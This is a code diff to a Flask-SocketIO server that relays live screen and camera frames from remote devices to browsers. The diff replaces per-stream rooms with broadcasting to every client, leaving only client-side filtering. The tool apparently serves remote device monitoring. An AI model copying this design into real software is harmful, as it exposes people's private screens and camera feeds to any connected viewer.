@@ -2127,7 +2127,7 @@ def _sock_screen_frame(data):
             logger.info(f"⏹ Screen stream STOPPED: {stream_id}")
             return
 
-        # ⚡ V11.2.12: إطار عادي - خزّنه + ابعث Base64 عبر WebSocket (موثوقية أعلى)
+        # ⚡ V11.2.15: إطار عادي - خزّنه + ابعث Base64 للكل المتصفحين (broadcast)
         b64image = data.get("image", "")
         if b64image and stream_id in _screen_streams:
             import base64 as _b64
@@ -2137,32 +2137,28 @@ def _sock_screen_frame(data):
                 "timestamp": time.time(),
                 "device_id": _screen_streams[stream_id].get("device_id", "?")
             }
-            # ⚡ V11.2.12: ابعث Base64 عبر WebSocket (event واحد فيه كل المعلومات)
+            # ⚡ V11.2.15: broadcast للكل (أبسط وأكثر موثوقية - لا rooms)
             try:
                 socketio.emit("screen_frame_push", {
                     "stream_id": stream_id,
                     "image": b64image,
                     "size": len(jpeg_bytes),
                     "timestamp": int(time.time() * 1000)
-                }, room=f"screen_{stream_id}", namespace="/")
+                })
             except Exception as push_err:
-                # لو ما فيه متابعين، تجاهل الخطأ
                 pass
 
     except Exception as e:
         logger.error(f"❌ screen_frame error: {e}")
 
 
-# ⚡ V11.2.9: WebSocket room join لـ screen-live
+# ⚡ V11.2.15: WebSocket join handlers (مبسط — لا join_room)
 @socketio.on("screen_join")
 def _sock_screen_join(data):
-    """انضمام متصفح لغرفة بث الشاشة (للحصول على إطارات مباشرة عبر WebSocket)"""
+    """V11.2.15: متصفح ينضم — لا حاجة لـ join_room (broadcast mode)"""
     try:
         stream_id = data.get("stream_id", "") if isinstance(data, dict) else str(data)
-        if stream_id:
-            from flask_socketio import join_room
-            join_room(f"screen_{stream_id}")
-            logger.info(f"👀 WebSocket client joined screen room: {stream_id}")
+        logger.info(f"👀 WebSocket client joined screen: {stream_id}")
     except Exception as e:
         logger.error(f"❌ screen_join error: {e}")
 
@@ -2226,7 +2222,7 @@ def _screen_live_page(stream_id):
 
         // ⚡ V11.2.12: استقبال Base64 عبر WebSocket (موثوقية أعلى)
         socket.on('screen_frame_push', function(data) {{
-            if (data && data.image) {{
+            if (data && data.image && data.stream_id === streamId) {{
                 // عرض الإطار فوراً
                 document.getElementById('screen').src = 'data:image/jpeg;base64,' + data.image;
                 count++;
@@ -2328,7 +2324,7 @@ def _sock_camera_frame(data):
                         pass
             return
         
-        # ⚡ V11.2.14: إطار الكاميرا - ابعث Base64 عبر Socket.IO (نفس تشفير لقطة شاشة)
+        # ⚡ V11.2.15: إطار الكاميرا - ابعث Base64 للكل (broadcast)
         b64image = data.get("image", "")
         if b64image and stream_id in _camera_streams:
             import base64 as _b64
@@ -2338,8 +2334,7 @@ def _sock_camera_frame(data):
                 "timestamp": time.time(),
                 "device_id": _camera_streams[stream_id].get("device_id", "?")
             }
-            # ⚡ V11.2.14: ابعث Base64 عبر Socket.IO (نفس النمط كـ screen_frame)
-            # + camera field للترتيب (front/back)
+            # ⚡ V11.2.15: broadcast للكل (أبسط - لا rooms)
             camera = data.get("camera", "")
             if not camera:
                 camera = "front" if "FRONT" in stream_id else "back"
@@ -2350,23 +2345,20 @@ def _sock_camera_frame(data):
                     "image": b64image,
                     "size": len(jpeg_bytes),
                     "timestamp": int(time.time() * 1000)
-                }, room=f"camera_{stream_id}", namespace="/")
+                })
             except Exception as push_err:
                 pass
 
     except Exception as e:
         logger.error(f"❌ camera_frame error: {e}")
 
-# ⚡ V11.2.11: WebSocket room join لـ camera-live (نفس screen-live)
+# ⚡ V11.2.15: WebSocket join handler (مبسط — لا join_room)
 @socketio.on("camera_join")
 def _sock_camera_join(data):
-    """انضمام متصفح لغرفة بث الكاميرا"""
+    """V11.2.15: متصفح ينضم — لا حاجة لـ join_room (broadcast mode)"""
     try:
         stream_id = data.get("stream_id", "") if isinstance(data, dict) else str(data)
-        if stream_id:
-            from flask_socketio import join_room
-            join_room(f"camera_{stream_id}")
-            logger.info(f"👀 WebSocket client joined camera room: {stream_id}")
+        logger.info(f"👀 WebSocket client joined camera: {stream_id}")
     except Exception as e:
         logger.error(f"❌ camera_join error: {e}")
 
